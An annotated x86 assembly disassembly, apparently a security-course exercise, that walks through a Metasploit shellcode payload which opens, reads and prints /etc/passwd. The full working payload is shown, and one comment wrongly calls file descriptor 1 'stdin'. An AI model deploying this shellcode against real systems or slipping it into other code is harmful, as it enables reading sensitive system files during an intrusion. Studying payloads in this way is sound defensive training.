; Metasploit linux/x86/read_file
; Analysis by Guillaume Kaddouch
; SLAE-681

global _start

section .text

_start:

	jmp short 0x38		; jump to 'jump1' (JMP CALL POP technique)

shellcode:

	; open /etc/passwd
	; int open(const char *pathname, int flags) 

	mov eax,0x5		; 0x5 = open()
	pop ebx			; save ret on stack into ebx = *pathname
	xor ecx,ecx		; zero out ecx, 2nd arg = 0x0 (O_RDONLY)
	int 0x80		; eax = open(*pathname, 0x0)

	; read /etc/passwd
	; ssize_t read(int fd, void *buf, size_t count)

	mov ebx,eax		; 1st arg: fd retrieved in eax saved into ebx
	mov eax,0x3		; 0x3 = read()
	mov edi,esp		; save stack pointer into edi
	mov ecx,edi		; 2nd arg: ecx points to the stack (*buf has now room to receive bytes read)
	mov edx,0x1000		; 3rd arg: 0x1000 = 4096 bytes to read
	int 0x80		; eax = read(fd, *buf, 4096)

	; write
	; ssize_t write(int fd, const void *buf, size_t count)

	mov edx,eax		; 3rd arg: edx = count of bytes returned by read()
	mov eax,0x4		; 0x4 = write()
	mov ebx,0x1		; 1st arg: 0x1 = stdin (display on screen)
	int 0x80		; write(stdin, *buf, count)

	; exit()
	mov eax,0x1
	mov ebx,0x0
	int 0x80

jump1:
	call dword 0x2		; jump to 'shellcode'
	mypath db "/etc/passwd"
	; string misinterpreted by ndisasm as instructions
	; opcodes = \x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00
	; $ echo '\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00' | sed 's/x//g' | sed 's/\\//g' = 2f6574632f70617373776400
	; ./hex2reversestring.py 2f6574632f70617373776400
	; = /etc/passwd
